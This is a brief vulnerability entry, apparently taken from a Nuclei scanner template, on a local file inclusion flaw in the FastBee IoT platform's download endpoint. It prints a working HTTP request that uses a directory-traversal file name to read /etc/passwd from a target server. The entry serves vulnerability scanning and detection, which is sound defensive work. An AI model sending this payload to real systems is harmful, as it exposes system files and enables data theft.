# Vulnerability: FastBee - Local File Inclusion
**Classification:** FASTBEE
**Source:** Nuclei Template (`fastbee-arbitrary-file-read.yaml`)

## Description
Arbitrary file read vulnerability exists in FastBee IoT platform download, which may lead to sensitive information leakage, data theft and other security risks, thus causing serious harm to the system and users.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

